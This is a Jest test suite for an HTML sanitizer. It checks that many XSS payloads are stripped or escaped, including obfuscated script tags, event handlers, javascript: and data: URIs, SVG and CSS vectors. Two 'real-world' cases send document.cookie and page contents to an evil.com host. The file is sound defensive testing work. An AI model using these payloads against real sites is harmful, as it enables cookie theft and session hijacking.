/**
 * Extended test suite for XSS sanitization
 *
 * Additional tests covering:
 * - Advanced XSS attack vectors
 * - Protocol-based attacks
 * - CSS injection attacks
 * - SVG-based XSS
 * - Data URI exploits
 * - Performance and stress testing
 */

import { sanitizeHTML, escapeHTML } from "../src/utils/sanitizer";

describe("Sanitizer Module - Extended XSS Protection", () => {
  describe("Advanced XSS Attack Vectors", () => {
    test("should block encoded script tags", () => {
      const attacks = [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<SCRIPT>alert(1)//<</SCRIPT>",
        "<script>a=/XSS/;alert(a.source)</script>",
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/<script/i);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should block obfuscated event handlers", () => {
      const attacks = [
        '<img src=x on error=alert(1)>',
        '<img src=x on\nerror=alert(1)>',
        '<img src=x on\terror=alert(1)>',
        "<img src=x one%72ror=alert(1)>",
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/onerror/i);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should block Base64 encoded attacks", () => {
      const attacks = [
        '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/data:.*base64/i);
      });
    });

    test("should block mutation XSS (mXSS)", () => {
      const attacks = [
        "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
        "<listing><img src=x onerror=alert(1)></listing>",
        "<style><img src=x onerror=alert(1)></style>",
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/onerror/i);
        expect(result).not.toMatch(/alert/i);
      });
    });
  });

  describe("Protocol-Based Attacks", () => {
    test("should block javascript: protocol variants", () => {
      const attacks = [
        '<a href="javascript:alert(1)">click</a>',
        '<a href="java\nscript:alert(1)">click</a>',
        '<a href="java\tscript:alert(1)">click</a>',
        '<a href="java\x00script:alert(1)">click</a>',
        '<a href="jav&#x0A;ascript:alert(1)">click</a>',
        '<a href="jav&#x09;ascript:alert(1)">click</a>',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/javascript:/i);
      });
    });

    test("should block vbscript: protocol", () => {
      const attacks = [
        '<a href="vbscript:msgbox(1)">click</a>',
        '<img src="vbscript:msgbox(1)">',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/vbscript:/i);
      });
    });

    test("should block data: protocol in dangerous contexts", () => {
      const attacks = [
        '<script src="data:text/javascript,alert(1)">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
        '<object data="data:text/html,<script>alert(1)</script>">',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/data:/i);
      });
    });

    test("should allow safe data: URIs for images", () => {
      // Some sanitizers may allow data: URIs for images if properly validated
      const safeDataUri =
        '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==">';
      const result = sanitizeHTML(safeDataUri);
      // This test depends on your sanitizer's policy
      // Adjust based on actual implementation
    });
  });

  describe("CSS Injection Attacks", () => {
    test("should remove inline styles with expressions", () => {
      const attacks = [
        '<div style="width:expression(alert(1))">content</div>',
        '<div style="background:url(javascript:alert(1))">content</div>',
        '<div style="xss:expression(alert(1))">content</div>',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toContain("style=");
        expect(result).not.toMatch(/expression/i);
      });
    });

    test("should remove style tags with malicious content", () => {
      const attacks = [
        "<style>body { background:url(javascript:alert(1)); }</style>",
        "<style>@import 'javascript:alert(1)';</style>",
        "<style>*{xss:expression(alert(1))}</style>",
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toContain("<style");
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should remove link tags importing malicious stylesheets", () => {
      const attacks = [
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<link rel="stylesheet" href="data:text/css,body{background:url(javascript:alert(1))}">',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toContain("<link");
      });
    });
  });

  describe("SVG-Based XSS Attacks", () => {
    test("should block SVG with script tags", () => {
      const attacks = [
        "<svg><script>alert(1)</script></svg>",
        "<svg><script xlink:href='data:text/javascript,alert(1)'/>",
        "<svg><script href='data:text/javascript,alert(1)'/>",
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/<script/i);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should block SVG with event handlers", () => {
      const attacks = [
        "<svg onload=alert(1)>",
        "<svg><animate onbegin=alert(1)>",
        "<svg><set onbegin=alert(1)>",
        "<svg><animatetransform onbegin=alert(1)>",
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/onload|onbegin/i);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should block SVG with xlink:href attacks", () => {
      const attacks = [
        '<svg><use xlink:href="data:image/svg+xml,<svg><script>alert(1)</script></svg>">',
        '<svg><image xlink:href="javascript:alert(1)">',
        '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/javascript:/i);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should allow safe SVG content", () => {
      const safe =
        '<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="blue" /></svg>';
      const result = sanitizeHTML(safe);

      expect(result).toContain("<svg");
      expect(result).toContain("<circle");
      expect(result).toContain("blue");
    });
  });

  describe("Form-Based Attacks", () => {
    test("should block form submissions to malicious URLs", () => {
      const attacks = [
        '<form action="javascript:alert(1)">',
        '<form action="data:text/html,<script>alert(1)</script>">',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/javascript:/i);
      });
    });

    test("should block formaction attributes", () => {
      const attacks = [
        '<button formaction="javascript:alert(1)">click</button>',
        '<input type="submit" formaction="javascript:alert(1)">',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/formaction.*javascript/i);
      });
    });
  });

  describe("Meta Tag Attacks", () => {
    test("should block meta refresh redirects", () => {
      const attacks = [
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toContain("<meta");
      });
    });

    test("should block content-type meta tags", () => {
      const attack =
        '<meta http-equiv="Content-Type" content="text/html; charset=utf-7">';
      const result = sanitizeHTML(attack);
      expect(result).not.toContain("<meta");
    });
  });

  describe("Template and Import Attacks", () => {
    test("should block template tags with scripts", () => {
      const attacks = [
        "<template><script>alert(1)</script></template>",
        "<template><img src=x onerror=alert(1)></template>",
      ];

      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should block HTML imports", () => {
      const attack =
        '<link rel="import" href="javascript:alert(1)">';
      const result = sanitizeHTML(attack);
      expect(result).not.toContain("<link");
    });
  });

  describe("Performance and Stress Testing", () => {
    test("should handle extremely long strings efficiently", () => {
      const longString = "<div>" + "A".repeat(100000) + "</div>";
      const start = Date.now();
      const result = sanitizeHTML(longString);
      const duration = Date.now() - start;

      expect(result).toContain("A");
      expect(duration).toBeLessThan(1000); // Should complete in less than 1 second
    });

    test("should handle deeply nested structures", () => {
      let nested = "content";
      for (let i = 0; i < 100; i++) {
        nested = `<div>${nested}</div>`;
      }

      const result = sanitizeHTML(nested);
      expect(result).toContain("content");
    });

    test("should handle many attributes", () => {
      let attrs = "";
      for (let i = 0; i < 100; i++) {
        attrs += ` data-attr${i}="value${i}"`;
      }
      const html = `<div${attrs}>content</div>`;

      const result = sanitizeHTML(html);
      expect(result).toContain("content");
    });

    test("should handle mixed safe and malicious content", () => {
      const mixed = `
        <div class="safe">Safe content</div>
        <script>alert(1)</script>
        <p>More safe content</p>
        <img src=x onerror=alert(1)>
        <span>Even more safe content</span>
      `;

      const result = sanitizeHTML(mixed);
      expect(result).toContain("Safe content");
      expect(result).toContain("More safe content");
      expect(result).toContain("Even more safe content");
      expect(result).not.toMatch(/<script/i);
      expect(result).not.toMatch(/onerror/i);
      expect(result).not.toMatch(/alert/i);
    });
  });

  describe("escapeHTML() - Additional Edge Cases", () => {
    test("should escape consecutive special characters", () => {
      const input = "<<<>>>&&\"\"''";
      const result = escapeHTML(input);

      expect(result).toBe(
        "&lt;&lt;&lt;&gt;&gt;&gt;&amp;&amp;&quot;&quot;&#x27;&#x27;",
      );
    });

    test("should handle strings with all special characters", () => {
      const input = '<tag attr="value" & more=\'other\'>';
      const result = escapeHTML(input);

      // Verify dangerous characters are escaped into HTML entities
      expect(result).toContain("&lt;");
      expect(result).toContain("&gt;");
      expect(result).toContain("&quot;");
      expect(result).toContain("&#x27;");
      expect(result).toContain("&amp;");

      // Verify the original dangerous characters are not present in raw form
      // Note: We can't check for absence of & since it's part of HTML entities
      expect(result).not.toContain("<tag");
      expect(result).not.toContain(">");
      expect(result).not.toMatch(/" more/); // The raw quote should be escaped
    });

    test("should escape mixed content correctly", () => {
      const input = "Normal text <script> & </script> more text";
      const result = escapeHTML(input);

      expect(result).toContain("Normal text");
      expect(result).toContain("&lt;script&gt;");
      expect(result).toContain("&amp;");
      expect(result).toContain("more text");
    });

    test("should handle already-escaped entities", () => {
      const input = "&lt;already escaped&gt;";
      const result = escapeHTML(input);

      // Should double-escape the ampersand
      expect(result).toContain("&amp;lt;");
      expect(result).toContain("&amp;gt;");
    });
  });

  describe("Real-World Attack Scenarios", () => {
    test("should handle widget-specific attack scenarios", () => {
      // Attack via custom modal HTML
      const maliciousModal = `
        <div class="custom-modal">
          <h2>Payment Options</h2>
          <script>
            // Steal payment info
            fetch('https://evil.com/steal?data=' + document.cookie);
          </script>
        </div>
      `;

      const result = sanitizeHTML(maliciousModal);
      expect(result).toContain("Payment Options");
      expect(result).not.toContain("<script");
      expect(result).not.toMatch(/fetch|cookie/i);
    });

    test("should handle price injection attacks", () => {
      const maliciousPrice =
        '$99.99<img src=x onerror="this.src=\'https://evil.com/track?price=\'+document.body.innerHTML">';
      const escaped = escapeHTML(maliciousPrice);

      expect(escaped).not.toContain("<img");
      expect(escaped).toContain("&lt;img");
      expect(escaped).toContain("$99.99");
    });
  });

  describe("Browser-Specific Attack Vectors", () => {
    test("should block UTF-7 encoding attacks", () => {
      const attack = "+ADw-script+AD4-alert(1)+ADw-/script+AD4-";
      const result = sanitizeHTML(attack);

      // Should not interpret UTF-7 encoding
      expect(result).not.toContain("<script");
    });

    test("should block NULL byte injection", () => {
      const attack = "<script>alert(1)\x00</script>";
      const result = sanitizeHTML(attack);

      expect(result).not.toMatch(/<script/i);
    });
  });
});
